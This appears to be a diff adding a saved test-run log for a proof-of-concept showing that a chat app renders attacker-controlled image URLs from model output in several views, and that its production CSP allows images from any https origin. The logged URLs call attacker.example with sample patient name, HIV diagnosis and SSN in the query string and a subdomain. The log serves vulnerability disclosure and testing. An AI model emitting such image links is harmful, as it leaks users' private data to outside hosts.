@@ -1,0 +1,25 @@
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=picture'
+]
+[poc] rendered <source srcset> values: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=srcset'
+]
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline
+[poc] favicon lookups requested for: [ 'https://leak-c3NuPTEyMy00NS02Nzg5.attacker.example/' ]
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > GenUI render_artifact_preview (markdown source) renders attacker <img src> with no plugins at all
+[poc] artifact markdown img src: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=artifact'
+]
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > ```markdown code fence preview (auto-opened after streaming) renders attacker <img src>
+[poc] markdown code-fence preview img src: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=codefence'
+]
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > production CSP (vercel.json) allows the browser to fetch those images from any https origin
+[poc] production CSP img-src: img-src 'self' data: blob: https:
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline 148ms
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > GenUI render_artifact_preview (markdown source) renders attacker <img src> with no plugins at all 15ms
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > ```markdown code fence preview (auto-opened after streaming) renders attacker <img src> 61ms
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > production CSP (vercel.json) allows the browser to fetch those images from any https origin 1ms
+ Test Files  1 passed (1)
+      Tests  4 passed (4)
+   Start at  01:29:10
+   Duration  4.23s (transform 604ms, setup 140ms, import 2.86s, tests 229ms, environment 798ms)
